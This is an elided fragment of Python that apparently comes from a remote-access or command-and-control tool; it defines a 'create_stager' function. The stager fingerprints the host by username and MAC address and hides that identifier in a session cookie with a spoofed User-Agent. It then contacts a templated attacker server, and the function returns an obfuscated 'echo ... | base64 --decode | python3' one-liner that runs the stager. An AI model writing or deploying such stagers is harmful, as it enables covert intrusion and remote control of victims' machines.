...
def create_stager(server_host, server_port, loader_options):
    ...
    def get_uid():
        uid_str = getpass.getuser() + "-" + str(getnode())
        return hexlify(uid_str.encode())


    {0} = "{1}"
    data = {{
        "Cookie": f"session=" + str(b64encode(get_uid()), "ascii") + "-{2}",
        "User-Agent": "{3}"
    }}

    try:
        request = urllib.request.Request("{4}", headers=data)
    ...
    return "echo {} | base64 --decode | python3".format(b64encode(stager_code.encode()).decode())
